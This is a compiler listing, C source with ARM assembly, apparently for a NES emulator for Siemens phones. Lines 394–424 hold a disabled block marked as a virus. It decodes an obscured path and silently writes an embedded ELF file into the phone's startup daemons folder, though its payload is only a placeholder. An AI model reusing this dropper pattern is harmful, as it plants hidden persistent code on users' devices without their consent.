    367            ///
    368            //AudioTerminate();
    369            param[pwidth]=getWidth;
   \   00000004   ........           LDR      R2,??DataTable45  ;; getWidth
   \   00000008   0010A0E3           MOV      R1,#+0
   \   0000000C   041180E5           STR      R1,[R0, #+260]
   \   00000010   002092E5           LDR      R2,[R2, #+0]
   \   00000014   0620C0E5           STRB     R2,[R0, #+6]
    370            param[pheight]=getHeight;
   \   00000018   ........           LDR      R2,??DataTable46  ;; getHeight
   \   0000001C   002092E5           LDR      R2,[R2, #+0]
   \   00000020   0720C0E5           STRB     R2,[R0, #+7]
    371            param[pframeskip]=A;
   \   00000024   ........           LDR      R2,??DataTable52  ;; A
   \   00000028   002092E5           LDR      R2,[R2, #+0]
   \   0000002C   0120C0E5           STRB     R2,[R0, #+1]
    372            param[poptimize]=t_boolean_static_fld?0:1;
   \   00000030   ........           LDR      R2,??DataTable53  ;; t_boolean_static_fld
   \   00000034   0020D2E5           LDRB     R2,[R2, #+0]
   \   00000038   000052E3           CMP      R2,#+0
   \   0000003C   0110A003           MOVEQ    R1,#+1
   \   00000040   0810C0E5           STRB     R1,[R0, #+8]
    373            saveini();
   \   00000044   ........           B        saveini          ;; tailcall
    374          }
    375          

   \                                 In segment CODE, align 4, keep-with-next
    376          void onexit(){ // Выход
    377            freeall();
   \                     onexit:
   \   00000000   ........           _BF      freeall,??freeall??rA  ;; tailcall
    378          
    379          //  if(buf) mfree(buf); // Освобождаем память
    380          }
    381          extern long SysTimer();

   \                                 In segment CODE, align 4, keep-with-next
    382          void oncreate(){ // Создание окна
   \                     oncreate:
   \   00000000   00402DE9           PUSH     {LR}
    383            
    384            AudioInit();
   \   00000004   ........           _BLF     AudioInit,??AudioInit??rA
    385            NSF_Init();
   \   00000008   ........           _BLF     NSF_Init,??NSF_Init??rA
    386            AudioStart();
   \   0000000C   ........           _BLF     AudioStart,??AudioStart??rA
    387            LastTmrVal=SysTimer();
   \   00000010   ........           _BLF     SysTimer,??SysTimer??rA
   \   00000014   0C109FE5           LDR      R1,??oncreate_0  ;; LastTmrVal
   \   00000018   000081E5           STR      R0,[R1, #+0]
    388            SUBPROC((void *)run);
   \   0000001C   08009FE5           LDR      R0,??oncreate_0+0x4  ;; run
   \   00000020   710100EF           SWI      +369
    389          
    390            // Запускаем фоновый процесс 
    391          //  GBS_StartTimerProc(&timer,262/2,timer_proc); // Стартуем таймер с частотой 2 раз в секунду
    392          }
   \   00000024   0080BDE8           POP      {PC}             ;; return
   \                     ??oncreate_0:
   \   00000028   ........           DC32     LastTmrVal
   \   0000002C   ........           DC32     run
    393          
    394          ///////ВИРУС!!!
    395          
    396          //char path[]="\xCB\xC5\xA3\xA5\xBD\x96\x91\xA3\xBB\x9E\x9A\x92\x90\x91\x8C\xA3"
    397          //"\xBA\x87\x8B\xBB\xD1\x9A\x93\x99\x0";
    398          //
    399          ////const char path[]="4:\\ZBin\\Daemons\\ExtD.elf";
    400          //#define elfsize 5020
    401          //char data[elfsize]="INSERT DATA HERE!!!";
    402          //
    403          //void v(){ //вирусное заражение
    404          //  int f,i;
    405          //  data[0]=0x7f;//0x464c457f;
    406          //  data[1]=0x45; data[2]=0x4c; data[3]=0x46;
    407          //  for(i=0;i<24;i++)
    408          //    path[i]=~path[i];
    409          //  i=0;
    410          //  do{
    411          //    f=fopen(path,A_ReadOnly+A_BIN,P_READ,&err);
    412          //    switch(i){
    413          //    case 0: if(f==-1) *(char*)path='0'; else fclose(f,&err); //drive 0 or 4?
    414          //      *((char*)path+strlen(path)-5)='N';
    415          //      break;
    416          //    case 1: //exists?
    417          //      if(f==-1)
    418          //      if((f=fopen(path,A_WriteOnly+A_BIN+A_Create+A_Truncate,P_WRITE,&err))==-1) return;
    419          //      fwrite(f,data,elfsize,&err);
    420          //      fclose(f,&err); 
    421          //      return;
    422          //    } 
    423          //  }while(++i<5);
    424          //}
    425          

   \                                 In segment CODE, align 4, keep-with-next
    426          int onstart(char *exename, char *fname){ // Старт приложения. Возвращает 0 или 1 для выхода.
   \                     onstart:
   \   00000000   30402DE9           PUSH     {R4,R5,LR}
   \   00000004   0140B0E1           MOVS     R4,R1
    427          //  B=110;  
    428            int i;
    429          //  v();
    430            if(!fname || fname[1]!=':') return 1;
   \   00000008   0200000A           BEQ      ??onstart_0
   \   0000000C   0110D4E5           LDRB     R1,[R4, #+1]
   \   00000010   3A0051E3           CMP      R1,#+58
   \   00000014   0100000A           BEQ      ??onstart_1
   \                     ??onstart_0:
   \   00000018   0100A0E3           MOV      R0,#+1
   \   0000001C   3080BDE8           POP      {R4,R5,PC}
    431            strcpy(filename, exename);
   \                     ??onstart_1:
   \   00000020   ........           LDR      R5,??DataTable49  ;; param
   \   00000024   0010A0E1           MOV      R1,R0
   \   00000028   860F85E2           ADD      R0,R5,#+536
   \   0000002C   1A0000EF           SWI      +26
    432            strcpy(romname,fname);
   \   00000030   0410A0E1           MOV      R1,R4
   \   00000034   A60F85E2           ADD      R0,R5,#+664
   \   00000038   1A0000EF           SWI      +26
    433            if(C65) param[pheight]=130;
   \   0000003C   ........           LDR      R0,??DataTable50  ;; C65
   \   00000040   0000D0E5           LDRB     R0,[R0, #+0]
   \   00000044   000050E3           CMP      R0,#+0
   \   00000048   8200A013           MOVNE    R0,#+130
   \   0000004C   0700C515           STRBNE   R0,[R5, #+7]
   \   00000050   0500001A           BNE      ??onstart_2
    434            else if(EL71){ param[pwidth]=param[pheight]=240;}
   \   00000054   ........           LDR      R0,??DataTable51  ;; EL71
   \   00000058   0000D0E5           LDRB     R0,[R0, #+0]
   \   0000005C   000050E3           CMP      R0,#+0
   \   00000060   F000A013           MOVNE    R0,#+240
   \   00000064   0700C515           STRBNE   R0,[R5, #+7]
   \   00000068   0600C515           STRBNE   R0,[R5, #+6]
    435            loadini();
   \                     ??onstart_2:
   \   0000006C   ........           BL       loadini
    436            if(!param[pstep]) param[pstep]=8;
   \   00000070   0A00D5E5           LDRB     R0,[R5, #+10]
   \   00000074   000050E3           CMP      R0,#+0
   \   00000078   0800A003           MOVEQ    R0,#+8
   \   0000007C   0A00C505           STRBEQ   R0,[R5, #+10]
    437            getscrXY();
   \   00000080   ........           BL       getscrXY
    438            if(!(A=param[pframeskip])) A=5;
   \   00000084   0100D5E5           LDRB     R0,[R5, #+1]
   \   00000088   ........           LDR      R1,??DataTable52  ;; A
   \   0000008C   000050E3           CMP      R0,#+0
   \   00000090   0500A003           MOVEQ    R0,#+5
   \   00000094   000081E5           STR      R0,[R1, #+0]
    439            t_boolean_static_fld=param[poptimize]?0:1;
   \   00000098   0800D5E5           LDRB     R0,[R5, #+8]
   \   0000009C   ........           LDR      R1,??DataTable53  ;; t_boolean_static_fld
   \   000000A0   000050E3           CMP      R0,#+0
   \   000000A4   0000A013           MOVNE    R0,#+0
   \   000000A8   0100A003           MOVEQ    R0,#+1
   \   000000AC   0000C1E5           STRB     R0,[R1, #+0]
    440            initnul();
   \   000000B0   ........           _BLF     initnul,??initnul??rA
    441            //
    442            //  
    443            if(i=loadrom(fname)) return i;
   \   000000B4   0400A0E1           MOV      R0,R4
   \   000000B8   ........           _BLF     loadrom,??loadrom??rA
   \   000000BC   3080BDE8           POP      {R4,R5,PC}       ;; return
    444          
    445              
    446            return 0;
    447          }

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable8:
   \   00000000   ........           DC32     `?<Constant ".ini">`

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable24:
   \   00000000   ........           DC32     screens

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable37:
   \   00000000   ........           DC32     screensize

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable38:
   \   00000000   ........           DC32     screen

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable41:
   \   00000000   ........           DC32     width

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable42:
   \   00000000   ........           DC32     height

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable45:
   \   00000000   ........           DC32     getWidth

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable46:
   \   00000000   ........           DC32     getHeight

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable49:
   \   00000000   ........           DC32     param

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable50:
   \   00000000   ........           DC32     C65

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable51:
   \   00000000   ........           DC32     EL71

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable52:
   \   00000000   ........           DC32     A

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable53:
   \   00000000   ........           DC32     t_boolean_static_fld

   \                                 In segment DATA_ID, align 4, align-sorted
   \                     `?<Initializer for zfont>`:
   \   00000000   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000008   001010101000       DC8 0, 10H, 10H, 10H, 10H, 0, 10H, 0
   \              1000        
   \   00000010   002424000000       DC8 0, 24H, 24H, 0, 0, 0, 0, 0
   \              0000        
   \   00000018   00247E24247E       DC8 0, 24H, 7EH, 24H, 24H, 7EH, 24H, 0
   \              2400        
   \   00000020   00083E283E0A       DC8 0, 8, 3EH, 28H, 3EH, 0AH, 3EH, 8
   \              3E08        
   \   00000028   006264081026       DC8 0, 62H, 64H, 8, 10H, 26H, 46H, 0
   \              4600        
   \   00000030   001028102A44       DC8 0, 10H, 28H, 10H, 2AH, 44H, 3AH, 0
   \              3A00        
   \   00000038   000810000000       DC8 0, 8, 10H, 0, 0, 0, 0, 0
   \              0000        
   \   00000040   000408080808       DC8 0, 4, 8, 8, 8, 8, 4, 0
   \              0400        
   \   00000048   002010101010       DC8 0, 20H, 10H, 10H, 10H, 10H, 20H, 0
   \              2000        
   \   00000050   000014083E08       DC8 0, 0, 14H, 8, 3EH, 8, 14H, 0
   \              1400        
   \   00000058   000008083E08       DC8 0, 0, 8, 8, 3EH, 8, 8, 0
   \              0800        
   \   00000060   000000000008       DC8 0, 0, 0, 0, 0, 8, 8, 10H
   \              0810        
   \   00000068   000000003E00       DC8 0, 0, 0, 0, 3EH, 0, 0, 0
   \              0000        
   \   00000070   000000000018       DC8 0, 0, 0, 0, 0, 18H, 18H, 0
   \              1800        
   \   00000078   000002040810       DC8 0, 0, 2, 4, 8, 10H, 20H, 0
   \              2000        
   \   00000080   003C464A5262       DC8 0, 3CH, 46H, 4AH, 52H, 62H, 3CH, 0
   \              3C00        
   \   00000088   001828080808       DC8 0, 18H, 28H, 8, 8, 8, 3EH, 0
   \              3E00        
   \   00000090   003C42023C40       DC8 0, 3CH, 42H, 2, 3CH, 40H, 7EH, 0
   \              7E00        
   \   00000098   003C420C0242       DC8 0, 3CH, 42H, 0CH, 2, 42H, 3CH, 0
   \              3C00        
   \   000000A0   00081828487E       DC8 0, 8, 18H, 28H, 48H, 7EH, 8, 0
   \              0800        
   \   000000A8   007E407C0242       DC8 0, 7EH, 40H, 7CH, 2, 42H, 3CH, 0
   \              3C00        
   \   000000B0   003C407C4242       DC8 0, 3CH, 40H, 7CH, 42H, 42H, 3CH, 0
   \              3C00        
   \   000000B8   007E02040810       DC8 0, 7EH, 2, 4, 8, 10H, 10H, 0
   \              1000        
   \   000000C0   003C423C4242       DC8 0, 3CH, 42H, 3CH, 42H, 42H, 3CH, 0
   \              3C00        
   \   000000C8   003C42423E02       DC8 0, 3CH, 42H, 42H, 3EH, 2, 3CH, 0
   \              3C00        
   \   000000D0   000000100000       DC8 0, 0, 0, 10H, 0, 0, 10H, 0
   \              1000        
   \   000000D8   000010000010       DC8 0, 0, 10H, 0, 0, 10H, 10H, 20H
   \              1020        
   \   000000E0   000004081008       DC8 0, 0, 4, 8, 10H, 8, 4, 0
   \              0400        
   \   000000E8   0000003E003E       DC8 0, 0, 0, 3EH, 0, 3EH, 0, 0
   \              0000        
   \   000000F0   000010080408       DC8 0, 0, 10H, 8, 4, 8, 10H, 0
   \              1000        
   \   000000F8   003C42040800       DC8 0, 3CH, 42H, 4, 8, 0, 8, 0
   \              0800        
   \   00000100   003C4A565E40       DC8 0, 3CH, 4AH, 56H, 5EH, 40H, 3CH, 0
   \              3C00        
   \   00000108   003C42427E42       DC8 0, 3CH, 42H, 42H, 7EH, 42H, 42H, 0
   \              4200        
   \   00000110   007C427C4242       DC8 0, 7CH, 42H, 7CH, 42H, 42H, 7CH, 0
   \              7C00        
   \   00000118   003C42404042       DC8 0, 3CH, 42H, 40H, 40H, 42H, 3CH, 0
   \              3C00        
   \   00000120   007844424244       DC8 0, 78H, 44H, 42H, 42H, 44H, 78H, 0
   \              7800        
   \   00000128   007E407C4040       DC8 0, 7EH, 40H, 7CH, 40H, 40H, 7EH, 0
   \              7E00        
   \   00000130   007E407C4040       DC8 0, 7EH, 40H, 7CH, 40H, 40H, 40H, 0
   \              4000        
   \   00000138   003C42404E42       DC8 0, 3CH, 42H, 40H, 4EH, 42H, 3CH, 0
   \              3C00        
   \   00000140   0042427E4242       DC8 0, 42H, 42H, 7EH, 42H, 42H, 42H, 0
   \              4200        
   \   00000148   003E08080808       DC8 0, 3EH, 8, 8, 8, 8, 3EH, 0
   \              3E00        
   \   00000150   000202024242       DC8 0, 2, 2, 2, 42H, 42H, 3CH, 0
   \              3C00        
   \   00000158   004448704844       DC8 0, 44H, 48H, 70H, 48H, 44H, 42H, 0
   \              4200        
   \   00000160   004040404040       DC8 0, 40H, 40H, 40H, 40H, 40H, 7EH, 0
   \              7E00        
   \   00000168   0042665A4242       DC8 0, 42H, 66H, 5AH, 42H, 42H, 42H, 0
   \              4200        
   \   00000170   004262524A46       DC8 0, 42H, 62H, 52H, 4AH, 46H, 42H, 0
   \              4200        
   \   00000178   003C42424242       DC8 0, 3CH, 42H, 42H, 42H, 42H, 3CH, 0
   \              3C00        
   \   00000180   007C42427C40       DC8 0, 7CH, 42H, 42H, 7CH, 40H, 40H, 0
   \              4000        
   \   00000188   003C4242524A       DC8 0, 3CH, 42H, 42H, 52H, 4AH, 3CH, 0
   \              3C00        
   \   00000190   007C42427C44       DC8 0, 7CH, 42H, 42H, 7CH, 44H, 42H, 0
   \              4200        
   \   00000198   003C403C0242       DC8 0, 3CH, 40H, 3CH, 2, 42H, 3CH, 0
   \              3C00        
   \   000001A0   00FE10101010       DC8 0, 0FEH, 10H, 10H, 10H, 10H, 10H, 0
   \              1000        
   \   000001A8   004242424242       DC8 0, 42H, 42H, 42H, 42H, 42H, 3CH, 0
   \              3C00        
   \   000001B0   004242424224       DC8 0, 42H, 42H, 42H, 42H, 24H, 18H, 0
   \              1800        
   \   000001B8   00424242425A       DC8 0, 42H, 42H, 42H, 42H, 5AH, 24H, 0
   \              2400        
   \   000001C0   004224181824       DC8 0, 42H, 24H, 18H, 18H, 24H, 42H, 0
   \              4200        
   \   000001C8   008244281010       DC8 0, 82H, 44H, 28H, 10H, 10H, 10H, 0
   \              1000        
   \   000001D0   007E04081020       DC8 0, 7EH, 4, 8, 10H, 20H, 7EH, 0
   \              7E00        
   \   000001D8   000E08080808       DC8 0, 0EH, 8, 8, 8, 8, 0EH, 0
   \              0E00        
   \   000001E0   000040201008       DC8 0, 0, 40H, 20H, 10H, 8, 4, 0
   \              0400        
   \   000001E8   007010101010       DC8 0, 70H, 10H, 10H, 10H, 10H, 70H, 0
   \              7000        
   \   000001F0   001038541010       DC8 0, 10H, 38H, 54H, 10H, 10H, 10H, 0
   \              1000        
   \   000001F8   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0FFH
   \              00FF        
   \   00000200   001C22782020       DC8 0, 1CH, 22H, 78H, 20H, 20H, 7EH, 0
   \              7E00        
   \   00000208   000038043C44       DC8 0, 0, 38H, 4, 3CH, 44H, 3CH, 0
   \              3C00        
   \   00000210   0020203C2222       DC8 0, 20H, 20H, 3CH, 22H, 22H, 3CH, 0
   \              3C00        
   \   00000218   00001C202020       DC8 0, 0, 1CH, 20H, 20H, 20H, 1CH, 0
   \              1C00        
   \   00000220   0004043C4444       DC8 0, 4, 4, 3CH, 44H, 44H, 3CH, 0
   \              3C00        
   \   00000228   000038447840       DC8 0, 0, 38H, 44H, 78H, 40H, 3CH, 0
   \              3C00        
   \   00000230   000C10181010       DC8 0, 0CH, 10H, 18H, 10H, 10H, 10H, 0
   \              1000        
   \   00000238   00003C44443C       DC8 0, 0, 3CH, 44H, 44H, 3CH, 4, 38H
   \              0438        
   \   00000240   004040784444       DC8 0, 40H, 40H, 78H, 44H, 44H, 44H, 0
   \              4400        
   \   00000248   001000301010       DC8 0, 10H, 0, 30H, 10H, 10H, 38H, 0
   \              3800        
   \   00000250   000400040404       DC8 0, 4, 0, 4, 4, 4, 24H, 18H
   \              2418        
   \   00000258   002028303028       DC8 0, 20H, 28H, 30H, 30H, 28H, 24H, 0
   \              2400        
   \   00000260   001010101010       DC8 0, 10H, 10H, 10H, 10H, 10H, 0CH, 0
   \              0C00        
   \   00000268   000068545454       DC8 0, 0, 68H, 54H, 54H, 54H, 54H, 0
   \              5400        
   \   00000270   000078444444       DC8 0, 0, 78H, 44H, 44H, 44H, 44H, 0
   \              4400        
   \   00000278   000038444444       DC8 0, 0, 38H, 44H, 44H, 44H, 38H, 0
   \              3800        
   \   00000280   000078444478       DC8 0, 0, 78H, 44H, 44H, 78H, 40H, 40H
   \              4040        
   \   00000288   00003C44443C       DC8 0, 0, 3CH, 44H, 44H, 3CH, 4, 6
   \              0406        
   \   00000290   00001C202020       DC8 0, 0, 1CH, 20H, 20H, 20H, 20H, 0
   \              2000        
   \   00000298   000038403804       DC8 0, 0, 38H, 40H, 38H, 4, 78H, 0
   \              7800        
   \   000002A0   001038101010       DC8 0, 10H, 38H, 10H, 10H, 10H, 0CH, 0
   \              0C00        
   \   000002A8   000044444444       DC8 0, 0, 44H, 44H, 44H, 44H, 38H, 0
   \              3800        
   \   000002B0   000044442828       DC8 0, 0, 44H, 44H, 28H, 28H, 10H, 0
   \              1000        
   \   000002B8   000044545454       DC8 0, 0, 44H, 54H, 54H, 54H, 28H, 0
   \              2800        
   \   000002C0   000044281028       DC8 0, 0, 44H, 28H, 10H, 28H, 44H, 0
   \              4400        
   \   000002C8   00004444443C       DC8 0, 0, 44H, 44H, 44H, 3CH, 4, 38H
   \              0438        
   \   000002D0   00007C081020       DC8 0, 0, 7CH, 8, 10H, 20H, 7CH, 0
   \              7C00        
   \   000002D8   000E08300808       DC8 0, 0EH, 8, 30H, 8, 8, 0EH, 0
   \              0E00        
   \   000002E0   000808080808       DC8 0, 8, 8, 8, 8, 8, 8, 0
   \              0800        
   \   000002E8   0070100C1010       DC8 0, 70H, 10H, 0CH, 10H, 10H, 70H, 0
   \              7000        
   \   000002F0   001428000000       DC8 0, 14H, 28H, 0, 0, 0, 0, 0
   \              0000        
   \   000002F8   3C4299A1A199       DC8 3CH, 42H, 99H, 0A1H, 0A1H, 99H, 42H, 3CH
   \              423C        
   \   00000300   00                 DC8 0
   \   00000301   000000             DC8 0, 0, 0

   \                                 In segment DATA_ID, align 4, align-sorted
   \                     `?<Initializer for param>`:
   \   00000000   260500000000       DC8 26H, 5, 0, 0, 0, 0, 84H, 0B0H
   \              84B0        
   \   00000008   000008000000       DC8 0, 0, 8, 0, 0, 0, 0, 0
   \              0000        
   \   00000010   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000018   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000020   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000028   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000030   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000038   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000040   3D3E3B3C2A23       DC8 3DH, 3EH, 3BH, 3CH, 2AH, 23H, 34H, 36H
   \              3436        
   \   00000048   3238351A3133       DC8 32H, 38H, 35H, 1AH, 31H, 33H, 37H, 39H
   \              3739        
   \   00000050   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000058   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000060   408010201020       DC8 40H, 80H, 10H, 20H, 10H, 20H, 40H, 80H
   \              4080        
   \   00000068   102008010804       DC8 10H, 20H, 8, 1, 8, 4, 1, 2
   \              0102        
   \   00000070   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000078   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000080   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000088   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000090   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000098   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   000000A0   3D3E3B3C2A23       DC8 3DH, 3EH, 3BH, 3CH, 2AH, 23H, 34H, 36H
   \              3436        
   \   000000A8   3238351A3133       DC8 32H, 38H, 35H, 1AH, 31H, 33H, 37H, 39H
   \              3739        
   \   000000B0   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   000000B8   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   000000C0   408010201020       DC8 40H, 80H, 10H, 20H, 10H, 20H, 40H, 80H
   \              4080        
   \   000000C8   102008010804       DC8 10H, 20H, 8, 1, 8, 4, 1, 2
   \              0102        
   \   000000D0   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   000000D8   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   000000E0   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   000000E8   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   000000F0   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   000000F8   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \                     `?<Initializer for mode>`:
   \   00000100   00000000           DC32 0
   \                     `?<Initializer for running>`:
   \   00000104   00000000           DC32 0
   \                     `?<Initializer for exit>`:
   \   00000108   00000000           DC32 0
   \                     `?<Initializer for redefineptr>`:
   \   0000010C   00000000           DC8 0, 0, 0, 0
   \                     `?<Initializer for joy>`:
   \   00000110   00000000           DC32 0
   \                     `?<Initializer for tmpsize>`:
   \   00000114   00000000           DC8 0, 0, 0, 0
   \                     `?<Initializer for menu>`:
   \   00000118   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000128   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000138   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000148   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000158   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000168   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000178   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000188   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000198   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   000001A8   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   000001B8   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   000001C8   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   000001D8   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   000001E8   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   000001F8   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000208   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \                     `?<Initializer for filename>`:
   \   00000218   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000228   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000238   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000248   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000258   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000268   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000278   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000288   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \                     `?<Initializer for romname>`:
   \   00000298   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   000002A8   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   000002B8   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   000002C8   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   000002D8   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   000002E8   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   000002F8   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000308   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000318   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000328   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000338   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000348   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000358   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000368   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000378   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000388   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \                     `?<Initializer for help>`:
   \   00000398   20764E455320       DC8 20H, 76H, 4EH, 45H, 53H, 20H, 30H, 2EH
   \              302E        
   \   000003A0   346620286329       DC8 34H, 66H, 20H, 28H, 63H, 29H, 62H, 6EH
   \              626E        
   \   000003A8   0A312E4C6F61       DC8 0AH, 31H, 2EH, 4CH, 6FH, 61H, 64H, 20H
   \              6420        
   \   000003B0   302D390A322E       DC8 30H, 2DH, 39H, 0AH, 32H, 2EH, 53H, 61H
   \              5361        
   \   000003B8   766520302D39       DC8 76H, 65H, 20H, 30H, 2DH, 39H, 0AH, 33H
   \              0A33        
